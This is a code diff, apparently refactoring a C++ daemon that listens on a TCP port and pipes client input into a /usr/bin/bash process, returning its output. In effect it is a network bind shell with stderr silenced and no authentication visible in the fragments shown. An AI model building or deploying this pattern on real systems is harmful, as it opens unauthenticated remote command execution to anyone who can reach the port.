@@ -1,4 +1,3 @@
-#include <stdio.h>
 #include <string.h>
 #include <sys/stat.h> // umask
 #include <netinet/in.h> // htons
@@ -47,7 +46,9 @@ public:
     if (bind(server_sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
        error("ERROR on binding");
   
-    listen(server_sock, 5);
+    // Max number of outstanding connections in the socket connection queue
+    const int backlog = 5;
+    listen(server_sock, backlog);
   
     clilen = sizeof(cli_addr);
   }
@@ -67,27 +68,26 @@ public:
     int ret;
 
     while (true) {
+      //=== READ FROM CLIENT
+
       bzero(buffer, 4096);
       int n = read(client_sock, buffer, 4095);
       if (n < 0) {
-        // Check if it is not timeout
+        // Check if it is not a timeout
         if ((errno != EAGAIN) && (errno != EWOULDBLOCK)) {
           error("ERROR reading from socket");
         }
       }
       if (n == 0) break;
       if (n > 1) {
-        std::cerr << "Message " << n << std::endl;
         // Reroute the message to STDOUT
         write(STDOUT_FILENO, buffer, n);
-        ret = fflush(stdout);
-        std::cerr << "Flush stdout " << ret << std::endl;
-        ret = fflush(stdin);
-        std::cerr << "Flush stdin " << ret << std::endl;
+        fflush(stdout);
+        fflush(stdin);
         sleep(0.5);
       }
 
-      //=== READ
+      //=== READ FROM PROCESS
 
       bzero(buffer, 4096);
       n = readTimeout(STDIN_FILENO, buffer, 4095, 0.1);
@@ -103,13 +103,7 @@ public:
         // TODO: Exit if timeout happens too often?
         continue;
       }
-      fprintf(stderr, "n = %d\n", n);
-      std::string line = "";
-      line = buffer;
-      // line += "\n";
-      std::cerr << line;
-      std::cerr << "Finished reading" << std::endl;
-      send(client_sock, line.c_str(), line.size(), 0);
+      send(client_sock, buffer, n, 0);
     }
 
     ::close(client_sock);
@@ -137,10 +131,6 @@ void startServer(int port)
   PipedProcess proc("/usr/bin/bash");
   dup2(proc.getStdinPipe(), STDOUT_FILENO);
   dup2(proc.getStdoutPipe(), STDIN_FILENO);
-  // int inpipe, outpipe;
-  // twoPipesExec("/usr/bin/bash", inpipe, outpipe);
-  // dup2(outpipe, STDOUT_FILENO);
-  // dup2(inpipe, STDIN_FILENO);
 
   //== Start server
   while (true) server.accept();
@@ -186,6 +176,8 @@ void startDaemon(int port)
 
   /* Close all open file descriptors */
   // for (int x = sysconf(_SC_OPEN_MAX); x>=0; x--) close (x);
+
+  /* Redirect stderr to /dev/null */
   freopen("/dev/null", "w+", stderr);
 
   /* Open the log file */
